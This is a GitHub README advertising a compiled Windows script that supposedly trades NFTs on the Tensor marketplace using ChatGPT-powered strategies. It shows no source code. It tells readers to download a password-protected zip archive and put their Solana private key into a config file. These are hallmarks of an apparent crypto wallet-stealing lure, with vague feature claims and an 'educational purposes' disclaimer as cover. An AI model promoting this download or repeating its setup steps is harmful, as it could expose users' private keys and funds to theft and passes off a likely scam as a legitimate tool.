# TensorTrade NFT Trading with ChatGPT Strategies

## Overview
This repository contains a compiled script for seamless trading operations within the TensorTrade NFT marketplace. The script is pre-configured to leverage ChatGPT-powered strategies, enabling users to engage in NFT asset trading with advanced AI-supported decision-making capabilities.

### Features
- Utilizes a non-official API for NFT data collection.
- Analyzes NFT collection rarity, launch time, and activity.
- Makes informed decisions on buying or selling tokens based on comprehensive data analysis.
- Customizable settings for personalized trading strategies.
- Real-time monitoring and notifications for important market events.
- Secure and efficient transaction execution.

### Dependencies
- .NET Framework 4.8
- Nethereum
- SolNET
- Windows 10 and newer versions

### Installation
- [Clone](https://github.com/origami-xyz/Tensor-trade-script/archive/refs/heads/main.zip) repository and extract files with password `Ci27S0etuIh`.
- Edit tensor.json with your data and launch the script.
  - `maxPosition` - maximum SOL for one transaction
  - `timeoutScan` - timeout between scans
  - `rpc` - your custom RPC (or use shyft.to)
  - `pkey` - your SOL private key (DON'T USE MAIN TO AVOID LOSS)
  - `decisionMode` - criteria to make decisions to buy NFT or not

### Configuration
```json
{
  "mainSettings": { 
    "maxPosition": "0.1",
    "timeoutScan": "30",
    "rpc": "https://<your-solana-rpc>.com:<port>",
    "pkey": "<your-solana-private-key>"
  },
  "decisionMode": {
    "rarityScan": "true",
    "floorCost": "true",
    "salesActivity": "true",
    "volumeScan": "true"
  }
}


### Usage Instructions
The repository includes comprehensive documentation and instructions for deploying and utilizing the compiled script. Follow the steps provided to set up and initiate trading activities within the TensorTrade NFT marketplace, benefitting from ChatGPT-powered strategies without extensive coding or configuration.


### Note
While the script integrates advanced ChatGPT strategies, understanding NFT market dynamics and employing risk management practices are crucial for successful trading.

---

**Disclaimer:** This repository is for educational and experimental purposes only. Always perform due diligence and use at your own risk.
